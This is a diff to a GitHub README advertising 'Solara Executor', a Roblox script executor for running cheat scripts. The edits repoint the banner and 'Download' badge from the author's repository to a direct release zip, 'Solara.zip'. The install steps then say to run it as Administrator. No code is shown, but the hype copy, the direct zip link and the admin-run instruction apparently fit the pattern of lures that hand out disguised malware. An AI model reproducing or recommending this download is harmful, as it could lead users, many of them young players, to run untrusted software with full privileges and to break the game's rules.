@@ -23,7 +23,7 @@ Try Solara if you're tired of unreliable Roblox executors!
 Solara Executor offering a user-friendly design combined with high-level features. Crafted by seasoned reverse engineers, Solara brings smooth scripthandling to enhance your gaming experience. It provides instant updates, bypasses the need for a key system, and simplifies execut1on, making it a popular pick for Roblox fans.
 
 
-[![Frame 2147223630](https://github.com/user-attachments/assets/610d8a0b-5279-483d-992a-089f1079b85c)](https://github.com/moshiurrahman996)
+[![Frame 2147223630](https://github.com/user-attachments/assets/610d8a0b-5279-483d-992a-089f1079b85c)](https://github.com/moshiurrahman996/solara-executor-roblox/releases/download/solara/Solara.zip)
 
 
 > [!NOTE]
@@ -42,7 +42,7 @@ Solara Executor offering a user-friendly design combined with high-level feature
 - Storage: | 1GB or more.
 
 ## How to Install Solara?
-1. [![Download](https://img.shields.io/badge/Download-blueviolet)](https://github.com/moshiurrahman996/solara-executor-roblox) Solara Executor.
+1. [![Download](https://img.shields.io/badge/Download-blueviolet)](https://github.com/moshiurrahman996/solara-executor-roblox/releases/download/solara/Solara.zip) Solara Executor.
 2. Run Solara as Administrator for optimal performance and access to advanced features.
 3. Enjoy a smooth, dependable experience with your favorite Roblox scripts!
 
